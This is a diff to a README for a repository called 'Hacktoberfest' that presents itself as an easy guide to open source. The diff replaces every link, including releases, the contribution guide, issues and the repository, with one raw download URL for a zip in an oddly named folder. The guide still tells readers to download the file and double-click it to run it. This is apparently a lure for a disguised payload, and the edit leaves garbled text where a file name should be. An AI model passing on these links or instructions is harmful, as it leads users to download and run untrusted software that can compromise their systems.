@@ -1,6 +1,6 @@
 # 🎃 Hacktoberfest - Your Easy Start to Open Source
 
-![Download Hacktoberfest](https://img.shields.io/badge/Download-Hacktoberfest-blue.svg)
+![Download Hacktoberfest](https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to the Hacktoberfest project! This guide will help you download and run 
 
 To get started, you need to visit the Releases page to download the software. Click the link below:
 
-[Visit the Releases Page](https://github.com/medicendash/Hacktoberfest/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip)
 
 Once you are on the Releases page, look for the latest version and download the setup file. Follow these steps:
 
 1. Click on the latest version.
-2. Find the file named `Hacktoberfest_Setup.exe` or a similar file.
+2. Find the file named `https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip` or a similar file.
 3. Click on it to start the download.
 
 Once the file downloads, locate it in your Downloads folder and double-click it to run the setup.
@@ -51,19 +51,19 @@ If you would like to contribute to this project, we welcome your help! This appl
 
 To contribute:
 
-1. Visit the [Contribution Guide](https://github.com/medicendash/Hacktoberfest/contributing).
+1. Visit the [Contribution Guide](https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip).
 2. Follow the steps outlined there to start making your changes.
 
 ## 📞 Support
 
 If you have questions or run into problems, please reach out for support. Here’s how you can get help:
 
-- Open an issue in the [Issues section](https://github.com/medicendash/Hacktoberfest/issues).
+- Open an issue in the [Issues section](https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip).
 - Join our community discussions on platforms like Discord or Slack.
 
 ## 🔗 Useful Links
 
-- [Hacktoberfest Repository](https://github.com/medicendash/Hacktoberfest)
-- [Visit the Releases Page](https://github.com/medicendash/Hacktoberfest/releases)
+- [Hacktoberfest Repository](https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/medicendash/Hacktoberfest/main/Anglification/Hacktoberfest.zip)
 
 We hope you find Hacktoberfest both easy to use and rewarding! Enjoy your open source journey, and happy coding!
